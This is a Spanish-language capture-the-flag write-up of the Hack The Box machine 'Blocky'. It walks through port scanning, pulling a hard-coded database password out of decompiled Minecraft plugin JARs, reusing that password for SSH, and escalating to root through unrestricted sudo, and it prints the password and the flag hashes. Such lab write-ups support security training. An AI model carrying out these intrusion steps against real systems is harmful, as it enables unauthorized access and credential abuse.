---
layout: post
title: Blocky
date: 2023-04-03
description:
img:
fig-caption:
tags: [eJPT]
---
___

<center><img src="/writeups/assets/img/Blocky-htb/Blocky.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Information Disclosure

* Análisis de código con jd-gui

* Reutilización de contraseñas

* Abuso de privilegio sudoers (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.37 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 17:11 GMT
Nmap scan report for 10.10.10.37
Host is up (0.15s latency).
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 27.55 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p21,22,80,25565 10.10.10.37 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 17:07 GMT
Nmap scan report for 10.10.10.37
Host is up (0.062s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
```

Añado el dominio ```blocky.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb```analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.37
http://10.10.10.37 [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], RedirectLocation[http://blocky.htb], Title[302 Found]
http://blocky.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```

La página principal se ve así:

<img src="/writeups/assets/img/Blocky-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null

```

En ```/plugins``` puedo descargar varios archivos JAR

<img src="/writeups/assets/img/Blocky-htb/2.png" alt="">

Los descargo para analizarlos con ```jd-gui```

```null
jd-gui BlockyCore.jar griefprevention-1.11.2-3.1.1.298.jar
```

Se filtran credenciales de acceso a la base de datos

```null
public String sqlUser = "root";  
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

Se reutiliza para el usuario ```Notch```. Puedo ver la primera flag

```null
ssh notch@blocky.htb
notch@blocky.htb's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Mon Apr  3 12:50:39 2023 from 10.10.16.2
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ cat user.txt 
4fb1e48a264f36f3850ae255b091a3d7
```

# Escalada

Puedo ejecutar cualquier comando como cualquier usuario. Me convierto en ```root```

```null
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# 
```

Puedo ver la segunda flag

```null
root@Blocky:/home/notch# cat /root/root.txt 
b1996cab6ec6681b70f1da3b6756c449
```